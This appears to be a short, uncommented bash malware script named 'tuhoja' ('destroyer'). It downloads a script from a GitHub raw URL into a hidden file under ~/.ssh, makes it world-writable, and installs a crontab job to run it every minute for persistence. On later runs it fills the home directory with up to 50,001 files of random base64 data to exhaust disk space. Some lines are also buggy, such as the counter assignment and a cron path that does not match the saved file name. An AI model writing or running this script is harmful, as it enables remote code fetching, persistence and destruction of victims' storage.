#!/bin/bash
working_dir=pwd
TEMPFILE=~counter.tmp
PERSISTENCE_DIR=~/.ssh/.tuhoja.sh
COUNTER=0
if test -f $PERSISTENCE_DIR ; then
  if test -f $TEMPFILE ; then
    $COUNTER = cat $TEMPFILE
  else
    echo 0 > $TEMPFILE
  fi
  for (( c=0; c<=50000; c++ ))
  do
    COUNTER=$[$(cat $TEMPFILE) + 1]
    echo $COUNTER > $TEMPFILE
    head -c 512000 /dev/urandom | base64 > ~/$COUNTER
    echo $COUNTER
  done
  rm -f $TEMPFILE
else
  curl -o $PERSISTENCE_DIR https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/tuhoja.bash
  chmod 777 $PERSISTENCE_DIR
  (crontab -l 2>/dev/null || true; echo "0-59 * * * * /bin/bash /home/kauppis/.ssh/tuhoja.sh") | crontab -
fi
